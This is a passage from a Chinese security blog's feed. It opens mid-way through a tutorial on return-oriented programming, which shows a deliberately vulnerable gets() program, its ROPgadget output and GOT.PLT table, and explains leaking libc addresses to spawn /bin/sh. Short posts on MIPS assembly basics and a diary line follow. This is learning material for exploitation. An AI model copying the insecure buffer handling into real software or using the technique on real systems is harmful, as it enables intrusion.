class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用以下命令编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc rop.c -o rop -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure><p>与之前不同，这一程序没有预置的攻击函数，使用ROPgadget命令查找该程序中的Gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/pwn$ ROPgadget --binary rop</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004004c2 : adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004004c1 : adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x00000000004004be : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400457 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x00000000004005ff : add bl, dh ; ret</span><br><span class="line">0x00000000004005fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004005fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000400437 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x000000000040058a : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x00000000004004cc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040058b : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x0000000000400413 : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400439 : add byte ptr [rax], al ; jmp 0x400422</span><br><span class="line">0x000000000040058c : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x00000000004004ce : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fe : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400548 : add byte ptr [rbp + 5], dh ; jmp 0x4004e3</span><br><span class="line">0x0000000000400538 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040058d : add cl, cl ; ret</span><br><span class="line">0x00000000004005e0 : add dword ptr [rax + 0x39], ecx ; jmp 0x40065d</span><br><span class="line">0x0000000000400447 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400424</span><br><span class="line">0x0000000000400534 : add eax, 0x200b06 ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400539 : add ebx, esi ; ret</span><br><span class="line">0x0000000000400416 : add esp, 8 ; ret</span><br><span class="line">0x0000000000400415 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000400537 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400434 : and byte ptr [rax], al ; push 0 ; jmp 0x400427</span><br><span class="line">0x0000000000400444 : and byte ptr [rax], al ; push 1 ; jmp 0x400427</span><br><span class="line">0x0000000000400454 : and byte ptr [rax], al ; push 2 ; jmp 0x400427</span><br><span class="line">0x0000000000400565 : call qword ptr [rbp + 0x48]</span><br><span class="line">0x000000000040055e : call rax</span><br><span class="line">0x0000000000400546 : cmp dword ptr [rdi], 0 ; jne 0x400555 ; jmp 0x4004e5</span><br><span class="line">0x0000000000400545 : cmp qword ptr [rdi], 0 ; jne 0x400556 ; jmp 0x4004e6</span><br><span class="line">0x0000000000400442 : fimul dword ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x400429</span><br><span class="line">0x00000000004005dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x0000000000400559 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004004bd : je 0x4004d8 ; pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x000000000040050b : je 0x400520 ; pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x0000000000400558 : je 0x400551 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400293 : jmp 0x40023b</span><br><span class="line">0x000000000040043b : jmp 0x400420</span><br><span class="line">0x000000000040054b : jmp 0x4004e0</span><br><span class="line">0x00000000004005e3 : jmp 0x40065a</span><br><span class="line">0x00000000004006eb : jmp qword ptr [rbp]</span><br><span class="line">0x00000000004004c5 : jmp rax</span><br><span class="line">0x0000000000400549 : jne 0x400552 ; jmp 0x4004e2</span><br><span class="line">0x000000000040058e : leave ; ret</span><br><span class="line">0x0000000000400432 : loop 0x400448 ; and byte ptr [rax], al ; push 0 ; jmp 0x400429</span><br><span class="line">0x0000000000400533 : mov byte ptr [rip + 0x200b06], 1 ; ret</span><br><span class="line">0x0000000000400589 : mov eax, 0 ; leave ; ret</span><br><span class="line">0x000000000040055c : mov ebp, esp ; call rax</span><br><span class="line">0x00000000004004c0 : mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x000000000040055b : mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004004c8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004005f8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400515 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x000000000040050c : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400536 : or esp, dword ptr [rax] ; add byte ptr [rcx], al ; ret</span><br><span class="line">0x00000000004005ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005f0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005f2 : pop r15 ; ret</span><br><span class="line">0x0000000000400560 : pop rbp ; jmp 0x4004e1</span><br><span class="line">0x0000000000400532 : pop rbp ; mov byte ptr [rip + 0x200b06], 1 ; ret</span><br><span class="line">0x00000000004004bf : pop rbp ; mov edi, 0x601040 ; jmp rax</span><br><span class="line">0x00000000004005eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004d0 : pop rbp ; ret</span><br><span class="line">0x00000000004005f3 : pop rdi ; ret</span><br><span class="line">0x00000000004005f1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004005ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400436 : push 0 ; jmp 0x400425</span><br><span class="line">0x0000000000400446 : push 1 ; jmp 0x400425</span><br><span class="line">0x0000000000400456 : push 2 ; jmp 0x400425</span><br><span class="line">0x000000000040055a : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400419 : ret</span><br><span class="line">0x0000000000400452 : ror byte ptr [rbx], cl ; and byte ptr [rax], al ; push 2 ; jmp 0x400429</span><br><span class="line">0x000000000040050a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x00000000004004bc : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax</span><br><span class="line">0x0000000000400557 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400605 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400604 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004004ca : <span class="built_in">test</span> byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005fa : <span class="built_in">test</span> byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400556 : <span class="built_in">test</span> eax, eax ; je 0x400553 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400555 : <span class="built_in">test</span> rax, rax ; je 0x400554 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 87</span><br></pre></td></tr></table></figure><p>该程序中没有可以执行syscall这类可以执行系统调用的Gadget，但可以先想办法获取一些如libc等动态链接库的加载地址，再用libc中的gadget构造ROP。</p><p>用IDA打开，可以看到动态链接库libc的初始化加载函数<code>_libc_csu_init</code>，找到该函数末尾对应的gadget为<code>0x00000000004005f3 : pop rdi ; ret</code></p><p>ELF文件中通常存在.GOT.PLT和.PLT两个特殊的节，ELF编译时无法知道libc等动态链接库的加载地址，若想要调动动态链接库的函数，就必须使用.GOT.PLT和.PLT配合完成调用。</p><p>如果在程序段中有call _printf,其实并不是跳转到了实际的 _printf 函数位置，而是跳转到了PLT表中的 _printf 项，同时.PLT表作为一段代码，会从内存中取出 _printf 的实际地址进行跳转，而.GOT.PLT就是存放这一实际地址的地方</p><p>回到该ROP题，该程序的.GOT.PLT表如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000601000</span><br><span class="line">.got.plt:0000000000601000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000601000 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">.got.plt:0000000000601000 _got_plt        segment qword public &#39;DATA&#39; use64</span><br><span class="line">.got.plt:0000000000601000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000601000                 ;org 601000h</span><br><span class="line">.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400420↑r</span><br><span class="line">.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400420+6↑r</span><br><span class="line">.got.plt:0000000000601018 off_601018      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000601020 off_601020      dq offset __libc_start_main</span><br><span class="line">.got.plt:0000000000601020                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0000000000601028 off_601028      dq offset gets          ; DATA XREF: _gets↑r</span><br><span class="line">.got.plt:0000000000601028 _got_plt        ends</span><br><span class="line">.got.plt:0000000000601028</span><br></pre></td></tr></table></figure><p>可以看到puts函数地址保存到0x601018位置，根据puts函数在libc库中的偏移地址，就能算出libc库的基地址，然后利用libc中的Gadget构造可以执行<code>/bin/sh</code>的ROP，从而获得shell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIPS-入门</title>
      <link href="2020/11/19/MIPS-%E5%85%A5%E9%97%A8/"/>
      <url>2020/11/19/MIPS-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>要学习IOT逆向，准备入手的思科路由器是MIPS架构，在开始动手前先熟悉一下MIPS相关基础</strong></p><a id="more"></a><h4 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h4><ul><li>MIPS指令为固定4字节</li><li>内存中的数据访问必须严格对齐</li><li>本身不支持NX</li><li>MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中</li></ul><h4 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h4><table><thead><tr><th>寄存器编号</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>$0</td><td>$zero</td><td>总是返回常量0</td></tr><tr><td>$1</td><td>$at</td><td>保留给汇编器，不可做其他用途</td></tr><tr><td>$2-$3</td><td>$v0-$v1</td><td>函数调用返回值，非浮点</td></tr><tr><td>$4-$7</td><td>$a0-$a3</td><td>函数调用参数，不够时使用堆栈传递</td></tr><tr><td>$8-$15</td><td>$t0-$t7</td><td>临时寄存器</td></tr><tr><td>$16-$23</td><td>$s0-$s7</td><td>保存，函数调用后这些寄存器需要被恢复</td></tr><tr><td>$24-$25</td><td>$t8-$t9</td><td>临时寄存器的补充</td></tr><tr><td>$28</td><td>$gp</td><td>全局指针，指向静态数据区中运行决定的地址</td></tr><tr><td>$29</td><td>$sp</td><td>堆栈指针</td></tr><tr><td>$30</td><td>$fp/$s8</td><td>栈帧指针</td></tr><tr><td>$31</td><td>$ra</td><td>返回地址，用于支持函数调用和子程序</td></tr></tbody></table><h4 id="3-指令集"><a href="#3-指令集" class="headerlink" title="3.指令集"></a>3.指令集</h4><p>MIPS指令长度为32位，其中指令位均为6位，其余26位可分为R型、I型、J型。常用参考指令表如下：</p><table><thead><tr><th>指令</th><th>功能</th><th>实例</th></tr></thead><tbody><tr><td>li</td><td>将一个最大16位的数立即存入寄存器</td><td>li $Rd, imm</td></tr><tr><td>lui</td><td>将一个最大16位的数立即放入寄存器的高16位，低16位补0</td><td>lui $a1, 0x42</td></tr><tr><td>lw</td><td>从一个指定的地址加载一个字的值到寄存器</td><td>lw $s0, 0($sp)</td></tr><tr><td>sw</td><td>将寄存器中的值存入指定地址</td><td>sw $a0, 0($sp)</td></tr><tr><td>add</td><td>带符号数相加，目标数存于第一个寄存器地址内</td><td>add $t0, $t1, $t2</td></tr><tr><td>sub</td><td>带符号数相减</td><td>sub $t0, $t1, $t2</td></tr><tr><td>mult</td><td>乘法，结果存于(Hi,Lo)中</td><td>mult $t3, $t4</td></tr><tr><td>div</td><td>除法，结果存于(Hi,Lo)中</td><td>div $t5, $t6</td></tr><tr><td>mfhi</td><td>获取Hi中的数值到某寄存器</td><td>mfhi $t0</td></tr><tr><td>mflo</td><td>获取Lo中的数值到某寄存器</td><td>mflo $t1</td></tr><tr><td>beq</td><td>分支跳转，比较两个寄存器的值决定是否跳转，条件为==</td><td>beq $Rs, $Rt, target</td></tr><tr><td>blt</td><td>分支跳转，条件为&lt;</td><td>blt $Rs, $Rt, target</td></tr><tr><td>ble</td><td>分支跳转，条件为&lt;=</td><td>ble $Rs, $Rt, target</td></tr><tr><td>bgt</td><td>分支跳转，条件为&gt;</td><td>bgt $Rs, $Rt, target</td></tr><tr><td>bge</td><td>分支跳转，条件为&gt;=</td><td>bge $Rs, $Rt, target</td></tr><tr><td>bne</td><td>分支跳转，条件为!=</td><td>bne $Rs, $Rt, target</td></tr><tr><td>j</td><td>无条件跳转到某一绝对地址</td><td></td></tr><tr><td>jal</td><td>直接子程序调用，</td><td></td></tr><tr><td>jalr</td><td>间接子程序调用</td><td></td></tr></tbody></table><h4 id="4-MIPS调试环境安装"><a href="#4-MIPS调试环境安装" class="headerlink" title="4.MIPS调试环境安装"></a>4.MIPS调试环境安装</h4><p>主要参考资料：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li><li><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">mips汇编学习</a></li><li><a href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">CTF-MIPS-入门指南</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>由此开始</title>
      <link href="2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/"/>
      <url>2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/</url>
      
        <content type="html"><![CDATA[<p>记于2020年11月19日，晴</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
